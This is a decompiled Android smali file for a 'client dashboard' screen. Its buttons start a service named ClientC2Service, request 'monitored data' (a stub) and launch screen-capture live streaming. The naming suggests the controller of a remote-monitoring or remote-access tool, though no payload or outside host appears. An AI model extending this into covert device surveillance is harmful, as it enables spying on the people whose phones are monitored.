.class public Lcom/smilex/client/activities/ClientDashboardActivity;
.super Landroidx/appcompat/app/AppCompatActivity;
.source "ClientDashboardActivity.java"

.field private static final REQUEST_CODE_MEDIA_PROJECTION:I = 0x1
.field private btnConnectAgent:Landroid/widget/Button;
.field private btnRequestData:Landroid/widget/Button;
.field private btnStartLiveStream:Landroid/widget/Button;
.field private tvAgentStatus:Landroid/widget/TextView;
.field private tvMonitoredData:Landroid/widget/TextView;

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .registers 3
    .param p1, "savedInstanceState"

    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V
    const v0, 0x7f0a001f    # layout:activity_client_dashboard
    invoke-virtual {p0, v0}, Lcom/smilex/client/activities/ClientDashboardActivity;->setContentView(I)V

    const v0, 0x7f080000    # id:btn_connect_agent
    invoke-virtual {p0, v0}, Lcom/smilex/client/activities/ClientDashboardActivity;->findViewById(I)Landroid/view/View;
    move-result-object v0
    check-cast v0, Landroid/widget/Button;
    iput-object v0, p0, Lcom/smilex/client/activities/ClientDashboardActivity;->btnConnectAgent:Landroid/widget/Button;

    const v0, 0x7f080001    # id:btn_request_data
    invoke-virtual {p0, v0}, Lcom/smilex/client/activities/ClientDashboardActivity;->findViewById(I)Landroid/view/View;
    move-result-object v0
    check-cast v0, Landroid/widget/Button;
    iput-object v0, p0, Lcom/smilex/client/activities/ClientDashboardActivity;->btnRequestData:Landroid/widget/Button;

    const v0, 0x7f080002    # id:btn_start_livestream
    invoke-virtual {p0, v0}, Lcom/smilex/client/activities/ClientDashboardActivity;->findViewById(I)Landroid/view/View;
    move-result-object v0
    check-cast v0, Landroid/widget/Button;
    iput-object v0, p0, Lcom/smilex/client/activities/ClientDashboardActivity;->btnStartLiveStream:Landroid/widget/Button;

    const v0, 0x7f080003    # id:tv_agent_status
    invoke-virtual {p0, v0}, Lcom/smilex/client/activities/ClientDashboardActivity;->findViewById(I)Landroid/view/View;
    move-result-object v0
    check-cast v0, Landroid/widget/TextView;
    iput-object v0, p0, Lcom/smilex/client/activities/ClientDashboardActivity;->tvAgentStatus:Landroid/widget/TextView;

    const v0, 0x7f080004    # id:tv_monitored_data
    invoke-virtual {p0, v0}, Lcom/smilex/client/activities/ClientDashboardActivity;->findViewById(I)Landroid/view/View;
    move-result-object v0
    check-cast v0, Landroid/widget/TextView;
    iput-object v0, p0, Lcom/smilex/client/activities/ClientDashboardActivity;->tvMonitoredData:Landroid/widget/TextView;

    iget-object v0, p0, Lcom/smilex/client/activities/ClientDashboardActivity;->btnConnectAgent:Landroid/widget/Button;
    new-instance v1, Lcom/smilex/client/activities/ClientDashboardActivity$1;
    invoke-direct {v1, p0}, Lcom/smilex/client/activities/ClientDashboardActivity$1;-><init>(Lcom/smilex/client/activities/ClientDashboardActivity;)V
    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    iget-object v0, p0, Lcom/smilex/client/activities/ClientDashboardActivity;->btnRequestData:Landroid/widget/Button;
    new-instance v1, Lcom/smilex/client/activities/ClientDashboardActivity$2;
    invoke-direct {v1, p0}, Lcom/smilex/client/activities/ClientDashboardActivity$2;-><init>(Lcom/smilex/client/activities/ClientDashboardActivity;)V
    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    iget-object v0, p0, Lcom/smilex/client/activities/ClientDashboardActivity;->btnStartLiveStream:Landroid/widget/Button;
    new-instance v1, Lcom/smilex/client/activities/ClientDashboardActivity$3;
    invoke-direct {v1, p0}, Lcom/smilex/client/activities/ClientDashboardActivity$3;-><init>(Lcom/smilex/client/activities/ClientDashboardActivity;)V
    invoke-virtual {v0, v1}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    return-void
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .registers 6
    .param p1, "requestCode"
    .param p2, "resultCode"
    .param p3, "data"

    invoke-super {p0, p1, p2, p3}, Landroidx/appcompat/app/AppCompatActivity;->onActivityResult(IILandroid/content/Intent;)V

    sget v0, Lcom/smilex/client/activities/ClientDashboardActivity;->REQUEST_CODE_MEDIA_PROJECTION:I
    if-ne p1, v0, :return_void

    const/4 v0, -0x1
    if-ne p2, v0, :return_void

    # Start LiveStreamService with MediaProjection result
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/smilex/client/services/LiveStreamService;
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    const-string v1, "result_data"
    invoke-virtual {v0, v1, p3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;
    invoke-virtual {p0, v0}, Lcom/smilex/client/activities/ClientDashboardActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    iget-object v0, p0, Lcom/smilex/client/activities/ClientDashboardActivity;->tvMonitoredData:Landroid/widget/TextView;
    const-string v1, "Live stream started"
    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    :return_void
    return-void
.end method

.method static synthetic access$000(Lcom/smilex/client/activities/ClientDashboardActivity;)Landroid/widget/TextView;
    .registers 2
    iget-object v0, p0, Lcom/smilex/client/activities/ClientDashboardActivity;->tvAgentStatus:Landroid/widget/TextView;
    return-object v0
.end method

.method static synthetic access$100(Lcom/smilex/client/activities/ClientDashboardActivity;)Landroid/widget/TextView;
    .registers 2
    iget-object v0, p0, Lcom/smilex/client/activities/ClientDashboardActivity;->tvMonitoredData:Landroid/widget/TextView;
    return-object v0
.end method

.method static synthetic access$200(Lcom/smilex/client/activities/ClientDashboardActivity;)V
    .registers 1
    invoke-direct {p0}, Lcom/smilex/client/activities/ClientDashboardActivity;->connectToAgent()V
    return-void
.end method

.method private connectToAgent()V
    .registers 3
    iget-object v0, p0, Lcom/smilex/client/activities/ClientDashboardActivity;->tvAgentStatus:Landroid/widget/TextView;
    const-string v1, "Connecting..."
    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
    # Start ClientC2Service
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/smilex/client/services/ClientC2Service;
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p0, v0}, Lcom/smilex/client/activities/ClientDashboardActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    return-void
.end method

.method static synthetic access$300(Lcom/smilex/client/activities/ClientDashboardActivity;)V
    .registers 1
    invoke-direct {p0}, Lcom/smilex/client/activities/ClientDashboardActivity;->requestMonitoredData()V
    return-void
.end method

.method private requestMonitoredData()V
    .registers 3
    iget-object v0, p0, Lcom/smilex/client/activities/ClientDashboardActivity;->tvMonitoredData:Landroid/widget/TextView;
    const-string v1, "Requesting data..."
    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
    # Send request via ClientC2Service
    return-void
.end method

.method static synthetic access$400(Lcom/smilex/client/activities/ClientDashboardActivity;)V
    .registers 1
    invoke-direct {p0}, Lcom/smilex/client/activities/ClientDashboardActivity;->startLiveStream()V
    return-void
.end method

.method private startLiveStream()V
    .registers 4
    iget-object v0, p0, Lcom/smilex/client/activities/ClientDashboardActivity;->tvMonitoredData:Landroid/widget/TextView;
    const-string v1, "Requesting screen capture permission..."
    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    const-string v0, "media_projection"
    invoke-virtual {p0, v0}, Lcom/smilex/client/activities/ClientDashboardActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v0
    check-cast v0, Landroid/media/projection/MediaProjectionManager;

    invoke-virtual {v0}, Landroid/media/projection/MediaProjectionManager;->createScreenCaptureIntent()Landroid/content/Intent;
    move-result-object v0

    sget v1, Lcom/smilex/client/activities/ClientDashboardActivity;->REQUEST_CODE_MEDIA_PROJECTION:I
    invoke-virtual {p0, v0, v1}, Lcom/smilex/client/activities/ClientDashboardActivity;->startActivityForResult(Landroid/content/Intent;I)V

    return-void
.end method
